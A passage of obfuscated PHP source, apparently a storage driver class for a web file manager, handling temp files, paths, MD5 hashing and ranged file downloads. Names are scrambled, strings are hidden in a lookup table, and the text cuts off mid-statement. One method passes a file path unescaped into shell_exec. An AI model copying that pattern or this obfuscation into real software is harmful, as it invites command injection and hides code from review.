IO::remove($EƒóŒ‡Æ¸); } return $e»Í´‹èÌæ ? $bƒ¾ˆİ¸’§ : !1; } public function tempFile($aÛˆë†Ì = '', $f¢°Ûï¿¾ = '') { goto DÄ¸ƒÆƒáà; f÷ŒÃá¼’Ÿ: return $EŞİ†ÎƒÀ”; goto DÌ–ëŞ; DÄ¸ƒÆƒáà: if (!$aÛˆë†Ì) { $aÛˆë†Ì = rand_string(15); } $C ì…ˆªà = TEMP_FILES . rand_string(15) . $_SERVER[¿õñ][8]; @mkdir($C ì…ˆªà, 511, !0); goto dáˆåŠÛò¬; dáˆåŠÛò¬: $EŞİ†ÎƒÀ” = $C ì…ˆªà . $aÛˆë†Ì; @touch($EŞİ†ÎƒÀ”); if ($f¢°Ûï¿¾) { file_put_contents($EŞİ†ÎƒÀ”, $f¢°Ûï¿¾); } goto f÷ŒÃá¼’Ÿ; DÌ–ëŞ: } public function tempFileRemve($B¡‹ÜìÅà) { @unlink($B¡‹ÜìÅà); @rmdir($this->pathFather($B¡‹ÜìÅà)); } public function mkfile($b ®ÄÈëà¡, $AÛÅ­‚Ë¼‚ = '', $C¨“ÊÖœ˜Ù = REPEAT_RENAME) { } public function mkdir($a«ù‚øÃ‚½, $EƒµÛÊ‚”± = REPEAT_SKIP) { } public function copyFile($F½…æ­ŠÓ, $E™ˆÏªÍ¤) { } public function moveFile($bò·Öµïá, $DŸ¥š…¿”õ) { } public function remove($a¶…ÀÍ¯µ) { if ($this->isFile($a¶…ÀÍ¯µ)) { return $this->delFile($a¶…ÀÍ¯µ); } return $this->delFolder($a¶…ÀÍ¯µ); } public function rename($d®Û¡Š”Ş, $f›ÀÜîœ³ğ) { } public function exist($Eö¸æ›Ê÷) { } public function findByHash($Eâ‡‰ˆ¬øˆ = '', $bÃ’Ğä‚ÖÖ = '') { return !1; } public function isFile($c›ŸØ¤ˆ—Ö) { } public function isFolder($dÎ›Ç»ÆÃ°) { } public function size($eçÁ¥éŠÅˆ) { } public function info($DÉšĞÈ‘˜Ë) { } public function infoSimple($FÌ»Ü»íŠ) { return $this->info($FÌ»Ü»íŠ); } public function infoAuth($c©®ëÙ¤Íæ) { return $this->info($c©®ëÙ¤Íæ); } public function infoFull($c›îğÒòŠ¤) { return $this->info($c›îğÒòŠ¤); } public function infoWithChildren($BœŒ¢‚ß§ï) { $c‘Õ‡å®Ìñ =& $_SERVER[¿õñ]; $bİœÁâ›ã = $this->info($BœŒ¢‚ß§ï); if ($bİœÁâ›ã && $bİœÁâ›ã[$c‘Õ‡å®Ìñ[29]] == $c‘Õ‡å®Ìñ[77]) { $d‹°×ôÓïÃ = array($c‘Õ‡å®Ìñ[78] => 0, $c‘Õ‡å®Ìñ[79] => 0, $c‘Õ‡å®Ìñ[80] => 0); $this->infoChildren($BœŒ¢‚ß§ï, $d‹°×ôÓïÃ); $bİœÁâ›ã[$c‘Õ‡å®Ìñ[78]] = $d‹°×ôÓïÃ[$c‘Õ‡å®Ìñ[78]]; $bİœÁâ›ã[$c‘Õ‡å®Ìñ[81]] = array($c‘Õ‡å®Ìñ[82] => $d‹°×ôÓïÃ[$c‘Õ‡å®Ìñ[79]], $c‘Õ‡å®Ìñ[83] => $d‹°×ôÓïÃ[$c‘Õ‡å®Ìñ[80]]); } return $bİœÁâ›ã; } public function listPath($CÏÄêÃñ½, $c²ˆ¿‰ãÖ = false) { } public function has($Eˆåº³à¼, $f¯Ë¨ëèÙÀ = false, $bÏ’Æ™Õò = false) { } public function canRead($aˆ¨º«î¾ ) { } public function canWrite($eè¨àŞ¥ªè) { } public function getContent($DÃÚƒ™Ñ­) { } public function setContent($fÛ¥»Û¾Œ’, $d‹ìœóÙŞ = '') { } protected function infoChildren($eéŒîÉ‚¤¹, &$C¥…¤ÂÖ…œ) { $f§·×´ñÑ =& $_SERVER[¿õñ]; check_abort(); $a¬àˆ¾Ñ¯å = $this->listPath($eéŒîÉ‚¤¹, !0); $a¬àˆ¾Ñ¯å = array_merge($a¬àˆ¾Ñ¯å[$f§·×´ñÑ[75]], $a¬àˆ¾Ñ¯å[$f§·×´ñÑ[74]]); foreach ($a¬àˆ¾Ñ¯å as $FˆŠ¿ÑÊ©) { if ($FˆŠ¿ÑÊ©[$f§·×´ñÑ[29]] == $f§·×´ñÑ[77]) { $C¥…¤ÂÖ…œ[$f§·×´ñÑ[80]]++; $eÄÈ¤¨Ê°´ = $this->getPathInner($FˆŠ¿ÑÊ©[$f§·×´ñÑ[76]]); $this->infoChildren($eÄÈ¤¨Ê°´, $C¥…¤ÂÖ…œ); } else { $C¥…¤ÂÖ…œ[$f§·×´ñÑ[79]]++; $C¥…¤ÂÖ…œ[$f§·×´ñÑ[78]] += $FˆŠ¿ÑÊ©[$f§·×´ñÑ[78]]; } } } public function fileSubstr($eø…Ğè¤Û‘, $bĞÛ²¡‚ïÖ, $DùÈŞİƒ®æ) { } public function listAll($cÄ„…‰ƒ™ä) { } public function upload($DÄêğ©õ¬Å, $e¹íº›ì…, $AÄ‡ôßÙ ì = false, $b×…ß÷š»µ = REPEAT_REPLACE) { } public function uploadFileByID($B²§¼Éƒ¤ó, $Dò‹½‘Èå’, $A¯Œ¬å‹‡¸) { } public function uploadFileByPath($eİëÏ¶Š·, $fÆøæµÆÊŒ, $bó×Â¬°øˆ = array()) { } public function uploadLink($FÄ«Á†ß”, $Dô‡Î°‚Î = 0) { goto D‡ƒô¼ô‡Ÿ; BõÙ—Ê®Îò: $Aé‹Ÿ•Û„¹ = $Dô‡Î°‚Î <= $a’‰É§Ø×Ç ? $c±áÅàß¢Ó[86] : $c±áÅàß¢Ó[87]; if ($BÕ®² †’ù == $c±áÅàß¢Ó[61]) { $Aé‹Ÿ•Û„¹ = $c±áÅàß¢Ó[87]; } $d°¾°«çíÆ = (!$Dô‡Î°‚Î ? 1 : ceil($Dô‡Î°‚Î / pow(1024, 3))) * 3600 * 4; goto E¨ê¨Ãäçá; D‡ƒô¼ô‡Ÿ: $c±áÅàß¢Ó =& $_SERVER[¿õñ]; if ($GLOBALS[$c±áÅàß¢Ó[6]][$c±áÅàß¢Ó[84]][$c±áÅàß¢Ó[85]]) { return; } $BÕ®² †’ù = $this->getType(); goto c‡Ë½òïõ; c‡Ë½òïõ: if (!in_array($BÕ®² †’ù, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $a’‰É§Ø×Ç = 1024 * 1024 * 10; goto BõÙ—Ê®Îò; E¨ê¨Ãäçá: $c½Ì…Øå = $this->{$Aé‹Ÿ•Û„¹}($FÄ«Á†ß”, $d°¾°«çíÆ); if ($c½Ì…Øå) { $c½Ì…Øå[$c±áÅàß¢Ó[88]] = $FÄ«Á†ß”; $c½Ì…Øå[$c±áÅàß¢Ó[89]] = $BÕ®² †’ù; } return $c½Ì…Øå; goto B†¶™½–«Ğ; B†¶™½–«Ğ: } public function uploadFormData($a‰¹·µÛ‚, $a¿„ã‚‰¡ = 3600) { } public function multiUploadFormData($E´Ø…À’, $c¹¿»Õ˜¤ = 3600) { } public function osChunkSize() { $DâÄå©›³í =& $_SERVER[¿õñ]; $Bäó•Å³ƒ– = (double) $GLOBALS[$DâÄå©›³í[6]][$DâÄå©›³í[84]][$DâÄå©›³í[90]][$DâÄå©›³í[91]]; if (!$Bäó•Å³ƒ–) { $Bäó•Å³ƒ– = 1024 * 84 * 10; } return $Bäó•Å³ƒ–; } public function download($aÛ¶´¹ğ‹Ë, $EÍå—ñ¤¾£) { } public function ext($a·‚£ÁÜ) { $Fç‘¿Ÿ¢°Œ =& $_SERVER[¿õñ]; if (strpos($a·‚£ÁÜ, $Fç‘¿Ÿ¢°Œ[8]) === -1) { $aÜµ­îÅ²Š = $a·‚£ÁÜ; } else { $aÜµ­îÅ²Š = $this->pathThis($a·‚£ÁÜ); } $B°´Ğ…Ó = $Fç‘¿Ÿ¢°Œ[33]; if (strstr($aÜµ­îÅ²Š, $Fç‘¿Ÿ¢°Œ[92])) { $B°´Ğ…Ó = substr($aÜµ­îÅ²Š, strrpos($aÜµ­îÅ²Š, $Fç‘¿Ÿ¢°Œ[92]) + 1); $B°´Ğ…Ó = strtolower($B°´Ğ…Ó); } if (strlen($B°´Ğ…Ó) > 3 && preg_match($Fç‘¿Ÿ¢°Œ[93], $B°´Ğ…Ó, $aÒ˜†Á¨»ğ)) { $B°´Ğ…Ó = $Fç‘¿Ÿ¢°Œ[33]; } return $B°´Ğ…Ó; } public function pathThis($Eâ°—íÍ) { $Fé˜¼—ë =& $_SERVER[¿õñ]; $Eâ°—íÍ = str_replace($Fé˜¼—ë[94], $Fé˜¼—ë[8], rtrim($Eâ°—íÍ, $Fé˜¼—ë[8])); $F´âÀ•®“¶ = strrpos($Eâ°—íÍ, $Fé˜¼—ë[8]); if ($F´âÀ•®“¶ === !1) { return $Eâ°—íÍ; } return substr($Eâ°—íÍ, $F´âÀ•®“¶ + 1); } public function pathFather($Cª°ô†”‡ã) { $CìÓã÷Å©¦ =& $_SERVER[¿õñ]; $Cª°ô†”‡ã = str_replace($CìÓã÷Å©¦[94], $CìÓã÷Å©¦[8], rtrim($Cª°ô†”‡ã, $CìÓã÷Å©¦[8])); $AÛ«±®òùÒ = strrpos($Cª°ô†”‡ã, $CìÓã÷Å©¦[8]); if ($AÛ«±®òùÒ === !1) { return $CìÓã÷Å©¦[33]; } return substr($Cª°ô†”‡ã, 0, $AÛ«±®òùÒ + 1); } public function hashSimple($CÈÄÆè·¢Ó) { goto FóÙ¿¤‰ëñ; b…ÄÕğ§ª¨: $aÚØ‹£»õÇ = intval($DïøˆÏÉßë / $FŠ®ª»´™Ú); $a²Ş‰¡ï¥ì = $fáïéè±½É[33]; for ($Aå°˜£©’ = 0; $Aå°˜£©’ < $FŠ®ª»´™Ú; $Aå°˜£©’++) { $a²Ş‰¡ï¥ì .= $this->fileSubstr($CÈÄÆè·¢Ó, $aÚØ‹£»õÇ * $Aå°˜£©’, $b”˜ë–¡—§); } goto aˆİ²ï¸„Ã; aˆİ²ï¸„Ã: $a²Ş‰¡ï¥ì .= $this->fileSubstr($CÈÄÆè·¢Ó, $DïøˆÏÉßë - $b”˜ë–¡—§, $b”˜ë–¡—§); return md5($a²Ş‰¡ï¥ì) . $DïøˆÏÉßë; goto Bå ­ÒŸŞ; FóÙ¿¤‰ëñ: $fáïéè±½É =& $_SERVER[¿õñ]; if (!$CÈÄÆè·¢Ó) { return md5($fáïéè±½É[33]); } $DïøˆÏÉßë = $this->size($CÈÄÆè·¢Ó); goto Dù‘§Ãëâ; Dù‘§Ãëâ: $b”˜ë–¡—§ = 200; $FŠ®ª»´™Ú = 50; if ($DïøˆÏÉßë <= $b”˜ë–¡—§ * $FŠ®ª»´™Ú) { return $this->hashMd5($CÈÄÆè·¢Ó) . $DïøˆÏÉßë; } goto b…ÄÕğ§ª¨; Bå ­ÒŸŞ: } public static $md5Cache = array(); public function hashMd5($EâÀëÚ Í) { $EâÀëÚ Í = $this->iconvSystem($EâÀëÚ Í); if (isset(self::$md5Cache[$EâÀëÚ Í])) { return self::$md5Cache[$EâÀëÚ Í]; } self::$md5Cache[$EâÀëÚ Í] = $this->hashMd5Shell($EâÀëÚ Í); if (!self::$md5Cache[$EâÀëÚ Í]) { self::$md5Cache[$EâÀëÚ Í] = @md5_file($EâÀëÚ Í); } return self::$md5Cache[$EâÀëÚ Í]; } private function hashMd5Shell($fÀòÖ©‹îŠ) { goto E²Áª·¡£; Bï„ƒÄÂ‘¡: $a“’ï…‡§µ = Cache::get($b–Ö¡æ‚ÔÑ[98]); if (!$a“’ï…‡§µ) { $FÂé´ìÌ²È = BASIC_PATH . $b–Ö¡æ‚ÔÑ[99]; $F‘Ÿ†­ªÇÈ = md5_file($FÂé´ìÌ²È); $a“’ï…‡§µ = $b–Ö¡æ‚ÔÑ[100]; foreach ($B¦ˆ¸ãµö½ as $d’ß¦Ñª©) { $BßïÎõë = shell_exec($d’ß¦Ñª© . "\x20\x22{$FÂé´ìÌ²È}\x22"); if ($BßïÎõë && substr(trim($BßïÎõë), 0, 32) == $F‘Ÿ†­ªÇÈ) { $a“’ï…‡§µ = $d’ß¦Ñª©; break; } } Cache::set($b–Ö¡æ‚ÔÑ[98], $a“’ï…‡§µ, 3600); } if ($a“’ï…‡§µ == $b–Ö¡æ‚ÔÑ[100]) { return !1; } goto d‚çµÃ‰œæ; E²Áª·¡£: $b–Ö¡æ‚ÔÑ =& $_SERVER[¿õñ]; if (!function_exists($b–Ö¡æ‚ÔÑ[95])) { return !1; } $B¦ˆ¸ãµö½ = array($b–Ö¡æ‚ÔÑ[96], $b–Ö¡æ‚ÔÑ[97]); goto Bï„ƒÄÂ‘¡; d‚çµÃ‰œæ: $BßïÎõë = shell_exec($a“’ï…‡§µ . "\40\42{$fÀòÖ©‹îŠ}\42"); return substr($BßïÎõë, 0, 32); goto eí‰ÖÉ‘ĞÙ; eí‰ÖÉ‘ĞÙ: } public function link($Aö¡À†‘¤) { return $Aö¡À†‘¤; } public function fileOut($DÙ‹÷µâ‰¦, $CĞæàã™ÓÜ = false, $eã¥Ú¯‰´ = false, $fƒäâ·™µÊ = '') { goto C£¾ÂãÍ»; C£¾ÂãÍ»: $DÙ÷‰‡â°µ =& $_SERVER[¿õñ]; if (!$DÙ‹÷µâ‰¦ || !$this->exist($DÙ‹÷µâ‰¦)) { show_json(LNG($DÙ÷‰‡â°µ[101]), !1, $eã¥Ú¯‰´); } $C×‚Ëƒ›Ğá = $this->getType() == $DÙ÷‰‡â°µ[102]; goto CÊİ×ì­´å; F±Íƒ‚ùƒ†: while ($C¯–°ÙîÈ <= $Fƒù¾‡›¼) { $D«ÌÎ•Ãƒ‚ = timeFloat(); check_abort(); $AÆòÛ’Ó½ = $Fƒù¾‡›¼ - $C¯–°ÙîÈ + 1; if ($AÆòÛ’Ó½ <= $E‡”ö£ÜÄ) { $E‡”ö£ÜÄ = $AÆòÛ’Ó½; } echo $this->fileSubstr($DÙ‹÷µâ‰¦, $C¯–°ÙîÈ, $E‡”ö£ÜÄ); $C¯–°ÙîÈ += $E‡”ö£ÜÄ; if ($E‡”ö£ÜÄ == $AÆòÛ’Ó½) { $C¯–°ÙîÈ = $Fƒù¾‡›¼ + 1; } if ($cœ…ˆëŸˆæ) { $e…·äÙ£ï = intval(1000 * 1000 * (timeFloat() - $D«ÌÎ•Ãƒ‚)); $Cíµ£ªÓºÆ = $cœ…ˆëŸˆæ - $e…·äÙ£ï; if ($Cíµ£ªÓºÆ > 5) { usleep($Cíµ£ªÓºÆ); } } } goto aä„Â­¹Ö; f®£ˆ‚»Â¶: header($DÙ÷‰‡â°µ[132] . $f¿›×ãÔî¥); header($DÙ÷‰‡â°µ[133]); header($DÙ÷‰‡â°µ[134] . $bø™ÄŸ²Ëö); goto fª·Ã‡÷Ë´; E—íØÔ¥—º: if (isset($_SERVER[$DÙ÷‰‡â°µ[129]]) && $_SERVER[$DÙ÷‰‡â°µ[129]] == $fƒäâ·™µÊ) { header($DÙ÷‰‡â°µ[130] . $fƒäâ·™µÊ, !0, 304); die; } header($DÙ÷‰‡â°µ[130] . $fƒäâ·™µÊ); header($DÙ÷‰‡â°µ[131] . $dÌ˜ «±ÂØ . $DÙ÷‰‡â°µ[123]); goto f®£ˆ‚»Â¶; fëªİ«·ªÛ: $Fƒù¾‡›¼ = $bø™ÄŸ²Ëö - 1; $c«•ë•½ó¶ = $this->ext($f¿›×ãÔî¥); if (in_array($c«•ë•½ó¶, array($DÙ÷‰‡â°µ[107], $DÙ÷‰‡â°µ[108], $DÙ÷‰‡â°µ[109], $DÙ÷‰‡â°µ[110]))) { $c«•ë•½ó¶ = $DÙ÷‰‡â°µ[111]; } goto EÃÑ‡¡‘Èä; f‹¥¤³…İÖ: $b¾–¼À‡œÁ = $DÙ÷‰‡â°µ[112] . $b¾–¼À‡œÁ . $DÙ÷‰‡â°µ[116] . $b¾–¼À‡œÁ; if ($CĞæàã™ÓÜ) { header($DÙ÷‰‡â°µ[117]); header($DÙ÷‰‡â°µ[118] . $b¾–¼À‡œÁ); } else { header($DÙ÷‰‡â°µ[119] . $b¾–¼À‡œÁ); } header($DÙ÷‰‡â°µ[120]); goto D¦ÏŠ†É÷; EÃÑ‡¡‘Èä: if (!$fƒäâ·™µÊ) { $fƒäâ·™µÊ = md5($dÌ˜ «±ÂØ . $this->hashSimple($DÙ‹÷µâ‰¦)); } $fƒäâ·™µÊ = $DÙ÷‰‡â°µ[112] . $fƒäâ·™µÊ . $DÙ÷‰‡â°µ[112]; $c§ë›îÇìŒ = get_file_mime($c«•ë•½ó¶); goto D ÍİâÓ‹°; fª·Ã‡÷Ë´: header($DÙ÷‰‡â°µ[135]); $cÛòãº‘¸‘ = strtolower($_SERVER[$DÙ÷‰‡â°µ[136]]); if ($C×‚Ëƒ›Ğá && $cÛòãº‘¸‘ && $f¿©²­±Š) { if (strstr($cÛòãº‘¸‘, $DÙ÷‰‡â°µ[137])) { header($DÙ÷‰‡â°µ[138] . $DÙ‹÷µâ‰¦); } else { if (strstr($cÛòãº‘¸‘, $DÙ÷‰‡â°µ[139])) { header($DÙ÷‰‡â°µ[140] . $DÙ‹÷µâ‰¦); } else { if (strstr($cÛòãº‘¸‘, $DÙ÷‰‡â°µ[141])) { header($DÙ÷‰‡â°µ[142] . $DÙ‹÷µâ‰¦); } } } if ($bº×‰±ßÃÏ) { header($DÙ÷‰‡â°µ[143] . $bº×‰±ßÃÏ); } return; } goto f·…øÈ’—; D ÍİâÓ‹°: if (strstr($c§ë›îÇìŒ, $DÙ÷‰‡â°µ[113])) { $c§ë›îÇìŒ = $c§ë›îÇìŒ . $DÙ÷‰‡â°µ[114]; } if ($CĞæàã™ÓÜ === !1 && !mime_support($c§ë›îÇìŒ)) { $CĞæàã™ÓÜ = !0; $c§ë›îÇìŒ = $DÙ÷‰‡â°µ[115]; } $b¾–¼À‡œÁ = rawurlencode($f¿›×ãÔî¥); goto f‹¥¤³…İÖ; B„°ßÈ…éŒ: $dÌ˜ «±ÂØ = gmdate($DÙ÷‰‡â°µ[105], $d¿ù”ãÏ¡[$DÙ÷‰‡â°µ[106]]); $f¿›×ãÔî¥ = $eã¥Ú¯‰´ ? $eã¥Ú¯‰´ : $this->iconvApp($d¿ù”ãÏ¡[$DÙ÷‰‡â°µ[28]]); $C¯–°ÙîÈ = 0; goto fëªİ«·ªÛ; CÊİ×ì­´å: $f¿©²­±Š = $GLOBALS[$DÙ÷‰‡â°µ[6]][$DÙ÷‰‡â°µ[84]][$DÙ÷‰‡â°µ[90]][$DÙ÷‰‡â°µ[103]]; $bº×‰±ßÃÏ = (double) $GLOBALS[$DÙ÷‰‡â°µ[6]][$DÙ÷‰‡â°µ[84]][$DÙ÷‰‡â°µ[90]][$DÙ÷‰‡â°µ[104]] * 1024 * 1024; @ob_end_clean(); goto BÊà®¨ŒÓÎ; CßÊÌíˆèë: header($DÙ÷‰‡â°µ[125]); header($DÙ÷‰‡â°µ[126]); if (isset($_SERVER[$DÙ÷‰‡â°µ[127]]) && strtotime($_SERVER[$DÙ÷‰‡â°µ[127]]) == $d¿ù”ãÏ¡[$DÙ÷‰‡â°µ[106]]) { header($DÙ÷‰‡â°µ[128], !0, 304); die; } goto E—íØÔ¥—º; fî—¡®ˆá„: $E‡”ö£ÜÄ = 1024 * 100; $cœ…ˆëŸˆæ = 0; if ($bº×‰±ßÃÏ) { $cœ…ˆëŸˆæ = intval(1000 * 1000 * ($E‡”ö£ÜÄ / $bº×‰±ßÃÏ)); } goto F±Íƒ‚ùƒ†; f·…øÈ’—: if (isset($_SERVER[$DÙ÷‰‡â°µ[144]])) { if (preg_match($DÙ÷‰‡â°µ[145], $_SERVER[$DÙ÷‰‡â°µ[144]], $BÈáš´³Ã)) { $C¯–°ÙîÈ = intval($BÈáš´³Ã[1]); if (!empty($BÈáš´³Ã[2])) { $Fƒù¾‡›¼ = intval($BÈáš´³Ã[2]); } } header($DÙ÷‰‡â°µ[146]); header("\103\x6f\x6e\x74\145\x6e\164\x2d\x52\141\156\x67\x65\x3a\x20\x62\x79\164\145\x73\x20{$C¯–°ÙîÈ}\55{$Fƒù¾‡›¼}\x2f" . $bø™ÄŸ²Ëö); } else { header($DÙ÷‰‡â°µ[147]); } header($DÙ÷‰‡â°µ[148] . ($Fƒù¾‡›¼ - $C¯–°ÙîÈ + 1)); if ($_SERVER[$DÙ÷‰‡â°µ[149]] == $DÙ÷‰‡â°µ[150]) { return; } goto fî—¡®ˆá„; D¦ÏŠ†É÷: header($DÙ÷‰‡â°µ[121] . $c§ë›îÇìŒ); header($DÙ÷‰‡â°µ[122] . gmdate($DÙ÷‰‡â°µ[105], time() + 3600 * 24 * 30) . $DÙ÷‰‡â°µ[123]); header($DÙ÷‰‡â°µ[124]); goto CßÊÌíˆèë; BÊà®¨ŒÓÎ: set_timeout(); $d¿ù”ãÏ¡ = $this->infoFull($DÙ‹÷µâ‰¦); $bø™ÄŸ²Ëö = $d¿ù”ãÏ¡[$DÙ÷‰‡â°µ[78]]; goto B„°ßÈ…éŒ; aä„Â­¹Ö: } public function fileOutServer($C¹ÍšŸæÍÌ, $BŞ—Î•™Ë = false, $f¥ƒö±÷ÍÃ = false, $dÄñš¶¯óÆ = '') { $this->fileOut($C¹ÍšŸæÍÌ, $BŞ—Î•™Ë, $f¥ƒö±÷ÍÃ, $dÄñš¶¯óÆ); } public function fileOutLink($BŸ–šÁ±Éƒ) { $Eá‘ÜåæÀ =& $_SERVER[¿õñ]; if (substr($BŸ–šÁ±Éƒ, 0, 7) == $Eá‘ÜåæÀ[151]) { $BŸ–šÁ±Éƒ = $Eá‘ÜåæÀ[152] . substr($BŸ–šÁ±Éƒ, 7); } header($Eá‘ÜåæÀ[153] . $BŸ–šÁ±Éƒ); die; } public function cacheMehod($Dç—†ä•ØØ, $eÙâßˆ ‰¡) { goto EÁ¨Î¸¯‰œ; Dß¤›êĞ¯: $F›âÛ´¨ê[$b†ß™¤Ìš„] = $fŸÓßšƒâ; return $fŸÓßšƒâ; goto a»Æ„à³¡¾; dÇ‰á¼Õ¦: $fŸÓßšƒâ = isset($F›âÛ´¨ê[$b†ß™¤Ìš„]) ? $F›âÛ´¨ê[$b†ß™¤Ìš„] : null; if (!is_null($fŸÓßšƒâ)) { return $fŸÓßšƒâ; } $fŸÓßšƒâ = $this->{$Dç—†ä•ØØ}($eÙâßˆ ‰¡); goto Dß¤›êĞ¯; EÁ¨Î¸¯‰œ: $C•ß·Â¢‚ó =& $_SERVER[¿õñ]; static $F›âÛ´¨ê = array(); $b†ß™¤Ìš„ = $C•ß·Â¢‚ó[154] . $Dç—†ä•ØØ . $C•ß·Â¢‚ó[155] . rtrim($eÙâßˆ ‰¡, $C•ß·Â¢‚ó[8]); goto dÇ‰á¼Õ¦; a»Æ„à³¡¾: } public function fileOutImage($bâùŞ×Ä, $B¨½‡äÍ©­ = 250) { goto EåªÚ¸¸õŒ; AÚ©ŸÖ‘­¸: if (!($D³¡¸È•á = IO::move($B¼“ä¡­Ş³, $AˆİÌÙ‚‹»))) { return IO::fileOut($B¼“ä¡­Ş³); } del_file($B¼“ä¡­Ş³); IO::fileOut($D³¡¸È•á); goto fë²Êçë¾; D«Óö¼ºÄ: if ($EÄÜ†İÊ­[$dëİâšÎÉ[78]] <= 1024 * 50 || !function_exists($dëİâšÎÉ[156]) || $EÄÜ†İÊ­[$dëİâšÎÉ[157]] == $dëİâšÎÉ[158]) { return $this->fileOut($bâùŞ×Ä); } if (isset($EÄÜ†İÊ­[$dëİâšÎÉ[159]][$dëİâšÎÉ[160]])) { $AÓ“…‡Ê´ = $EÄÜ†İÊ­[$dëİâšÎÉ[159]][$dëİâšÎÉ[160]]; } else { if (isset($EÄÜ†İÊ­[$dëİâšÎÉ[159]][$dëİâšÎÉ[161]])) { $AÓ“…‡Ê´ = $EÄÜ†İÊ­[$dëİâšÎÉ[159]][$dëİâšÎÉ[161]]; } else { $AÓ“…‡Ê´ = md5("{$EÄÜ†İÊ­[$dëİâšÎÉ[28]]}\137{$EÄÜ†İÊ­[$dëİâšÎÉ[76]]}\137{$EÄÜ†İÊ­[$dëİâšÎÉ[78]]}"); } } $FôÒÛ¨øÜø = "{$AÓ“…‡Ê´}\137{$B¨½‡äÍ©­}\56\160\156\147"; goto EÑÏñ•ßé”; EÑÏñ•ßé”: if (!($dÒ¦‡ÍçÑØ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $dëİâšÎÉ[162]))) { $AˆİÌÙ‚‹» = IO::mkdir(IO_PATH_SYSTEM_TEMP . $dëİâšÎÉ[163]); } else { $AˆİÌÙ‚‹» = KodIO::make($dÒ¦‡ÍçÑØ); } if ($dÒ¦‡ÍçÑØ = IO::fileNameExist($AˆİÌÙ‚‹», $FôÒÛ¨øÜø)) { $B¼“ä¡­Ş³ = KodIO::make($dÒ¦‡ÍçÑØ); return IO::fileOut($B¼“ä¡­Ş³); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto e¸©¸ø‰; EåªÚ¸¸õŒ: $dëİâšÎÉ =& $_SERVER[¿õñ]; if (substr($bâùŞ×Ä, 0, 4) == $dëİâšÎÉ[141]) { $this->fileOutLink($bâùŞ×Ä); } $EÄÜ†İÊ­ = $this->info($bâùŞ×Ä); goto D«Óö¼ºÄ; e¸©¸ø‰: $B¼“ä¡­Ş³ = DATA_THUMB . $FôÒÛ¨øÜø; if (!@file_exists($B¼“ä¡­Ş³)) { $dİ“’Ë§ÜÚ = TEMP_FILES; if (!is_dir($dİ“’Ë§ÜÚ)) { mk_dir($dİ“’Ë§ÜÚ); } $a‰¥ç–¸¶Á = $dİ“’Ë§ÜÚ . $AÓ“…‡Ê´ . $dëİâšÎÉ[92] . $EÄÜ†İÊ­[$dëİâšÎÉ[157]]; if (!@file_exists($a‰¥ç–¸¶Á)) { $a‰¥ç–¸¶Á = $this->download($bâùŞ×Ä, $a‰¥ç–¸¶Á); } $F£‘Èœ™‘Š = new ImageThumb($a‰¥ç–¸¶Á, $dëİâšÎÉ[164]); $F£‘Èœ™‘Š->prorate($B¼“ä¡­Ş³, $B¨½‡äÍ©­, $B¨½‡äÍ©­); } if (!file_exists($B¼“ä¡­Ş³) || filesize($B¼“ä¡­Ş³) < 100) { return @file_exists($a‰¥ç–¸¶Á) ? IO::fileOut($a‰¥ç–¸¶Á) : $this->fileOut($bâùŞ×Ä); } goto AÚ©ŸÖ‘­¸; fë²Êçë¾: } public function fileOutImageServer($F‡»Ñø«ä½, $aíÖ’è‚œ‡ = 250) { $this->fileOutImage($F‡»Ñø«ä½, $aíÖ’è‚œ‡); } public function fileNameAuto($AÓõñâ¡èÖ, $f°õ‡±Òà„, $dÚ‚Îğ¾±Æ = REPEAT_RENAME, $d¸‡¥È†ŸŸ = false) { goto aŸÕáÔØµ ; Fİ‘ƒ„ ª›: if ($dÚ‚Îğ¾±Æ == REPEAT_SKIP) { return !1; } $Fõ‚Ş–Áø = $d¦´Ê°ÜŠ¤[92] . get_path_ext($f°õ‡±Òà„); $Fõ‚Ş–Áø = $Fõ‚Ş–Áø == $d¦´Ê°ÜŠ¤[92] || $d¸‡¥È†ŸŸ ? $d¦´Ê°ÜŠ¤[33] : $Fõ‚Ş–Áø; goto B†…†êº£; B†…†êº£: $aº‹Öœ¼Ù² = 1; $Aìµğ‡ˆ¸¿ = substr($f°õ‡±Òà„, 0, strlen($f°õ‡±Òà„) - strlen($Fõ‚Ş–Áø)); $cßçå×’ìÜ = $Aìµğ‡ˆ¸¿ . "\50{$aº‹Öœ¼Ù²}\x29{$Fõ‚Ş–Áø}"; goto EÆö›Ó±±Ô; EÆö›Ó±±Ô: while ($this->exist(rtrim($AÓõñâ¡èÖ, $d¦´Ê°ÜŠ¤[8]) . $d¦´Ê°ÜŠ¤[8] . $cßçå×’ìÜ)) { $cßçå×’ìÜ = $Aìµğ‡ˆ¸¿ . "\x28{$aº‹Öœ¼Ù²}\51{$Fõ‚Ş–Áø}"; $aº‹Öœ¼Ù²++; } return $cßçå×’ìÜ; goto f°ƒºˆŸ‘Æ; aŸÕáÔØµ : $d¦´Ê°ÜŠ¤ =& $_SERVER[¿õñ]; $B‰£Ú°Ãª = $AÓõñâ¡èÖ === $d¦´Ê°ÜŠ¤[33] ? $f°õ‡±Òà„ : rtrim($AÓõñâ¡èÖ, $d¦´Ê°ÜŠ¤[8]) . $d¦´Ê°ÜŠ¤[8] . $f°õ‡±Òà„; if ($dÚ‚Îğ¾±Æ == REPEAT_REPLACE || !$this->exist($B‰£Ú°Ãª) || $d¸‡¥È†ŸŸ && $dÚ‚Îğ¾±Æ != REPEAT_RENAME_FOLDER) { return $f°õ‡±Òà„; } goto Fİ‘ƒ„ ª›; f°ƒºˆŸ‘Æ: } public function listAllFiles($D¯•–©ò , $d¦ôÊ‘©Ş³, $E¬’’ñ…á = array()) { goto DŞÆÁÚø½Â; CŠ¤«Ú’: foreach (array_unique($e¯§â¼È™ ) as $aµ´Ìš™›Ò) { $dÒÊ°Š¢Ïæ = array($AÈ«‡ğæÎ[76] => $this->getPathOuter($AÈ«‡ğæÎ[8] . $D¯•–©ò  . $AÈ«‡ğæÎ[8] . $aµ´Ìš™›Ò), $AÈ«‡ğæÎ[77] => 1, $AÈ«‡ğæÎ[78] => 0); if (substr($aµ´Ìš™›Ò, -1) != $AÈ«‡ğæÎ[8]) { $dÒÊ°Š¢Ïæ[$AÈ«‡ğæÎ[77]] = 0; $Bé¤â·óØ = $this->getPath($D¯•–©ò  . $AÈ«‡ğæÎ[8] . $aµ´Ìš™›Ò); $dÒÊ°Š¢Ïæ[$AÈ«‡ğæÎ[78]] = isset($E¬’’ñ…á[$Bé¤â·óØ]) ? 